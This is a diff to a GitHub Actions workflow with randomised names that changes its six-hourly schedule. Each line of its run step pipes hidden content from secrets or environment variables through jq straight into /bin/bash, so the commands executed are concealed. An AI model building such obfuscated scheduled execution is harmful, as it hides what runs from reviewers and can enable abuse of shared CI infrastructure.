@@ -1,8 +1,9 @@
 name: liutang19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '14 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: liutang19871010
         env:
-          sx5394: ${{ secrets.sx5394 }}
+          hli691: ${{ secrets.hli691 }}
         run: |
-          echo $sx5394 | jq -r .u917 | /bin/bash
-          echo $kwo7 | jq -r .tjdoo34768 | /bin/bash
-          echo $sxb314 | jq -r .zyc3 | /bin/bash
-          echo $mp44 | jq -r .irinp42571 | /bin/bash
-          echo $fhfgv28 | jq -r .yc96 | /bin/bash
-          echo $bujz372 | jq -r .ty71 | /bin/bash
-          echo $zfti6964 | jq -r .wovwi40599 | /bin/bash
-          echo $mhnu45341 | jq -r .orwth3 | /bin/bash
-          echo $cux3 | jq -r .fcgxm90606 | /bin/bash
-          echo $lmkgz404 | jq -r .fb279 | /bin/bash
+          echo $hli691 | jq -r .r60 | /bin/bash
+          echo $xkws493 | jq -r .y2 | /bin/bash
+          echo $bqp036 | jq -r .l92 | /bin/bash
+          echo $fz91339 | jq -r .lncff985 | /bin/bash
+          echo $bwl61838 | jq -r .b27 | /bin/bash
 
